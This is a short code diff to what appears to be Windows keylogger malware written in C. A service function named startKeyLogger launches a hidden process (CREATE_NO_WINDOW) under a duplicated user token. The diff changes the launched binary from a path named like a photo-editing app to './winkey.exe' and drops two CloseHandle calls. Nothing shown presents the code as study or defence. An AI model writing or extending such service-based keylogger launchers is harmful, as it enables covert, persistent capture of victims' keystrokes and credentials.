@@ -15,7 +15,7 @@
 
 #pragma comment(lib, "advapi32.lib")
 
-LPSTR wszCommand = "C:\\Users\\Public\\PhotoScape.exe";
+LPSTR wszCommand = "./winkey.exe";
 
 SERVICE_STATUS        g_ServiceStatus = { 0 };
 SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
@@ -251,15 +251,12 @@ int startKeyLogger()
 
     if (!CreateProcessAsUser(newtoken, wszCommand, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
     {
-        CloseHandle(newtoken);
         fprintf(stderr, "CreateProcess returned error %lu\n", GetLastError());
         return -1;
     }
-    CloseHandle(newtoken);
 
     return (0);
 }
-
 
 DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
 {
